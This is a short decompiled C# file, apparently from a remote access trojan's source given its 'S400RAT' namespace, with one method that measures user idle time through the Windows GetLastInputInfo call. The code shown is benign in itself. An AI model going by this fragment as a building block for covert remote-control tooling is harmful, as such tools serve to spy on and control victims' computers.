using System;
using System.Runtime.InteropServices;

namespace S400RAT;

public class GClass7
{
	public struct GStruct0
	{
		public uint uint_0;

		public uint uint_1;
	}

	[DllImport("User32.dll")]
	public static extern bool GetLastInputInfo(ref GStruct0 gstruct0_0);

	public static uint smethod_0()
	{
		GStruct0 gStruct = default(GStruct0);
		GStruct0 structure = default(GStruct0);
		gStruct.uint_0 = Convert.ToUInt32(Marshal.SizeOf(structure));
		structure = gStruct;
		GetLastInputInfo(ref structure);
		return Convert.ToUInt32(Environment.TickCount) - structure.uint_1;
	}
}
